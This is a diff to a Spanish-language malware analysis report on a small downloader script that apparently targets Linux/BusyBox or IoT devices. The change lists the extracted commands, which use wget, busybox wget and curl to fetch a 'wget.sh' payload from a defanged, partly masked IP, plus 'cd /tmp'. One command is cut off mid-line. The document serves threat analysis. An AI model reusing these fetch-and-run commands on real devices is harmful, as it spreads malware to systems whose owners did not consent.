@@ -4,7 +4,14 @@
 
 ## 📌 Resumen
 
-Artefacto identificado como ASCII text, with CRLF line terminators de 381 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `wget.sh` en `hxxp://91.92.40.XXX/wget.sh`. Se observaron o extrajeron 1 comandos relacionados con el artefacto.
+Texto ASCII de 381 B. La evidencia disponible identifica capacidad de descarga remota. Recurso remoto principal: `wget.sh` en `hxxp://91.92.40.XXX/wget.sh`. **Comandos observados o extraídos, en orden de aparición en la evidencia:**
+
+1. `sh -s ddiag`
+2. `busybox wget hxxp://91.92.40.XXX/wget.sh -O-`
+3. `curl hxxp://91.92.40.XXX/wget.sh`
+4. `cd /tmp`
+5. `wget hxxp://91.92.40.XXX/wget.sh -O-`
+6. `busybox wget hxxp://91[.]9` Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Perfil técnico:** `Linux / BusyBox`, compatible con sistemas embebidos o IoT. BusyBox se trata como indicio de plataforma y no como prueba suficiente de que el dispositivo sea IoT. **Ficha malware:** [malware-like/oraculo/downloader/b9aaa29e51b9d58f0ebb899c472222719d26210ed5a8fb0b3eda0e1524acb2ea.md](../../../../../malware-like/oraculo/downloader/b9aaa29e51b9d58f0ebb899c472222719d26210ed5a8fb0b3eda0e1524acb2ea.md)
 
 
 ## 🏷️ Clasificación
